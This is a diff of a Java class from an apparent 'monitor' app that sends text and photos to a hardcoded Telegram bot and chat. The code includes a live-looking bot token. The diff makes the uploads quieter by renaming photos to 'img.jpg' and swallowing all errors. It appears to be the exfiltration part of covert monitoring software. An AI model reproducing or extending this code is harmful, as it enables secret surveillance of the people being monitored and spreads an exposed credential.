@@ -2,48 +2,27 @@ package com.tom5.monitor;
 
 import okhttp3.*;
 import java.io.File;
-import java.io.IOException;
 
 public class TelegramSender {
-    // 1. حط التوكن مالت بوتك هنا
-    private static final String BOT_TOKEN = "8254504974:AAEK4l6tyoFPOOaPN73A10Txf5Yq9Z5PlzY";
-    
-    // 2. حط الـ ID مالتك الشخصي هنا (بدون -100)
-    private static final String MY_CHAT_ID = "7259620384";
-    
-    private static final String API_URL = "https://api.telegram.org/bot" + BOT_TOKEN + "/";
+    private static final String TOKEN = "8254504974:AAEK4l6tyoFPOOaPN73A10Txf5Yq9Z5PlzY";
+    private static final String CHAT_ID = "7259620384";
+    private static final String BASE_URL = "https://api.telegram.org/bot" + TOKEN + "/";
 
-    public static void sendMessage(String text) {
+    public static void sendMessage(String msg) {
         new Thread(() -> {
-            OkHttpClient client = new OkHttpClient();
-            RequestBody body = new FormBody.Builder()
-                    .add("chat_id", MY_CHAT_ID)
-                    .add("text", text)
-                    .build();
-
-            Request request = new Request.Builder().url(API_URL + "sendMessage").post(body).build();
-            try { 
-                Response response = client.newCall(request).execute();
-                response.close();
-            } catch (IOException e) { e.printStackTrace(); }
+            OkHttpClient c = new OkHttpClient();
+            RequestBody b = new FormBody.Builder().add("chat_id", CHAT_ID).add("text", msg).build();
+            try { c.newCall(new Request.Builder().url(BASE_URL + "sendMessage").post(b).build()).execute().close(); } catch (Exception ignored) {}
         }).start();
     }
 
-    public static void sendPhoto(File file) {
+    public static void sendPhoto(File f) {
         new Thread(() -> {
-            OkHttpClient client = new OkHttpClient();
-            RequestBody body = new MultipartBody.Builder()
-                    .setType(MultipartBody.FORM)
-                    .addFormDataPart("chat_id", MY_CHAT_ID)
-                    .addFormDataPart("photo", file.getName(), 
-                            RequestBody.create(MediaType.parse("image/jpeg"), file))
-                    .build();
-
-            Request request = new Request.Builder().url(API_URL + "sendPhoto").post(body).build();
-            try { 
-                Response response = client.newCall(request).execute();
-                response.close();
-            } catch (IOException e) { e.printStackTrace(); }
+            OkHttpClient c = new OkHttpClient();
+            RequestBody b = new MultipartBody.Builder().setType(MultipartBody.FORM)
+                    .addFormDataPart("chat_id", CHAT_ID)
+                    .addFormDataPart("photo", "img.jpg", RequestBody.create(MediaType.parse("image/jpeg"), f)).build();
+            try { c.newCall(new Request.Builder().url(BASE_URL + "sendPhoto").post(b).build()).execute().close(); } catch (Exception ignored) {}
         }).start();
     }
 }
